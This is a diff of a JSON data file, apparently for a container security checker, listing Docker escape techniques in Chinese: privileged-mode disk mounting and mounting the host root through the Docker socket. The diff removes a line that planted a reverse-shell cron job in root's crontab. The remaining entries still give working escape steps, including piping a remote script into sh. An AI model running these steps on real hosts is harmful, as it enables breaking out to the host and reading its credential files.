@@ -13,12 +13,18 @@
       "test_command": "cat /proc/self/status | grep Cap",
       "expected_output": "\\s+CapEff:\\s+00000[0-9a-f]ffffffffff\\s+",
       "steps_to_exploit": [
-        "mkdir /test",
-        "mount /dev/sda /test",
-        "chroot /test /bin/sh -c 'cat /etc/passwd'"
+        "mkdir /test1",
+        "ls /dev/sda* --->test1",
+        "mount /dev/sda_ /test1",
+        "chroot /test1 /bin/sh -c 'cat /etc/passwd'"
       ],
       "steps_to_verify": [
-        "echo '* * * * * /bin/bash -i >& /dev/tcp/_/_ 0>&1' >> /test/var/spool/cron/crontabs/root"
+        "chroot /test1 /bin/sh -c 'ls /.dockerenv'"
+      ],
+      "verify_output":"No such file or directory",
+      "last_step": [
+        "umount -f /test1",
+        "rm -r /test1"
       ],
       "mitigation": "禁止特权模式启动Docker",
       "references": [
@@ -27,7 +33,7 @@
       ]
     },
     {
-      "name": "挂载 Docker Socket 逃逸",
+      "name": "挂载Docker Socket逃逸",
       "type": "Docker escape",
       "cve": "无",
       "description": "Docker Socket（也称为Docker API Socket）是Docker引擎的UNIX套接字文件，用于与Docker守护进程（Docker daemon）进行通信。Docker守护进程是Docker引擎的核心组件，负责管理和执行容器。Docker Socket允许用户通过基于RESTful API的请求与Docker守护进程进行通信，以便执行各种操作，例如创建、运行和停止容器，构建和推送镜像，查看和管理容器的日志等。",
@@ -40,15 +46,20 @@
       "expected_output": "-.*/var/run/docker.sock.*",
       "steps_to_exploit": [
         "apt-get update",
-        "apt-get install curl",
+        "apt-get install curl -y",
         "curl -fsSL https://get.docker.com/ | sh",
-        "docker run -it -v /:/ning ubuntu /bin/bash",
-        "chroot /test /bin/sh -c 'cat /etc/passwd'"
+        "docker run -it -v /:/test2 ubuntu /bin/bash",
+        "chroot /test2 /bin/sh -c 'cat /etc/passwd'"
       ],
       "steps_to_verify": [
-        "echo '* * * * * /bin/bash -i >& /dev/tcp/_/_ 0>&1' >> /test/var/spool/cron/crontabs/root"
+        "chroot /test2 /bin/sh -c 'ls /.dockerenv'"
       ],
-      "mitigation": "禁止特权模式启动Docker",
+      "verify_output":"No such file or directory",
+      "last_step": [
+        "umount -f /test2",
+        "rm -r /test2"
+      ],
+      "mitigation": "禁止docker.socket挂载",
       "references": [
         "https://example.com/cve-2024-xxxx",
         "https://exploit-db.com/exploits/xxxx"
